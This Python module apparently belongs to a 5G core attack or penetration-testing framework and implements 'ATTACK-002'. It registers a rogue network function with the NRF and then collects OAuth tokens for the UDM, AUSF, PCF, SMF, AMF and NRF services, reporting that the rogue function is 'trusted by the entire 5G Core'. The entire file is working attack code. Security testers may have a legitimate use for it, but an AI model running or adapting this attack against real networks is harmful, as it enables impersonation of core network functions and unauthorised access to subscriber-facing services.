from attacks.base_attack import BaseAttack, AttackResult
from core import http_client, nf_identity, token_manager
from config import NRF_URL

class RogueNFAttack(BaseAttack):
    attack_id = "ATTACK-002"
    name = "Rogue NF Registration + Token Acquisition"
    affected_nf = "NRF"
    endpoint = "PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}"

    def run(self) -> AttackResult:
        profile = nf_identity.get_rogue_nf_profile()
        nf_id = nf_identity.get_nf_instance_id()
        url = f"{NRF_URL}/nnrf-nfm/v1/nf-instances/{nf_id}"

        try:
            # Step 1: register rogue NF
            resp = http_client.put(url, json=profile)

            if resp.status_code not in [200, 201]:
                return self.result(
                    success=False,
                    data={},
                    evidence=f"NRF rejected registration with {resp.status_code}",
                    conclusion="Rogue NF registration failed — NRF may enforce identity verification."
                )

            registration_data = resp.json()

            # Step 2: acquire tokens for all NF types
            tokens = {}
            targets = [
                ("UDM",  "nudm-sdm"),
                ("AUSF", "nausf-auth"),
                ("PCF",  "npcf-am-policy-control"),
                ("SMF",  "nsmf-pdusession"),
                ("AMF",  "namf-comm"),
                ("NRF",  "nnrf-nfm"),
            ]

            for nf_type, scope in targets:
                token = token_manager.get_token(nf_type, scope)
                if token:
                    tokens[nf_type] = {
                        "scope": scope,
                        "token": token[:50] + "..."
                    }

            return self.result(
                success=True,
                data={
                    "registered_as": profile["nfType"],
                    "rogue_nf_id": nf_id,
                    "registration_response": registration_data,
                    "tokens_acquired": tokens
                },
                evidence=f"NRF accepted rogue {profile['nfType']} registration. "
                         f"Successfully acquired {len(tokens)} OAuth tokens.",
                conclusion=f"Rogue NF is now trusted by the entire 5G Core. "
                           f"Tokens acquired for: {', '.join(tokens.keys())}. "
                           f"All subsequent attacks can now proceed."
            )

        except Exception as e:
            return self.result(
                success=False,
                data={},
                evidence=str(e),
                conclusion="Attack failed — could not reach NRF."
            )